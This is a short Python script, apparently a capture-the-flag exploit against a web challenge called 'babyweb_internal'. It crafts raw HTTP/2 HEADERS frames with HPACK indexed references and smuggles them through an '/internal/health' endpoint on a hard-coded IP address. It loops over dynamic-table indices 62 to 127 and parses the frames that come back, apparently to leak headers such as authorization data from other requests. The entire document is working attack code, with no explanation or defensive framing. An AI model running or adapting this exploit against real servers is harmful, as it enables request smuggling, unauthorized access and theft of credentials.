import requests
import hpack
from hyperframe.frame import *

def header(id, idx):
    enc = hpack.Encoder()

    h1 = enc._encode_indexed(idx)
    h2 = enc._encode_indexed(idx + 1)
    ha = enc.encode({
        ':path': '/auth',
        ':method': 'GET' })

    hb = enc.encode({
        ':authority': 'babyweb_internal',
        ':scheme': 'https'
    })
    h = ha + hb + h1 + h2

    p = HeadersFrame(id, h)
    p.flags.add('END_HEADERS')
    p = p.serialize()
    return p

sess = requests.Session()
HOST = '35.187.196.233'

for i in range(62, 128):
    r = sess.post('http://' + HOST + '/internal/health', json={
        'data': b''.join([header(5, i)]).decode('latin-1'),
        'type': '2'
    })

    content = r.content
    print("")
    print(i)
    print(content)
    while content:
        frame, length = Frame.parse_frame_header(content[:9])
        print(frame, length)
        content = content[9 + length:]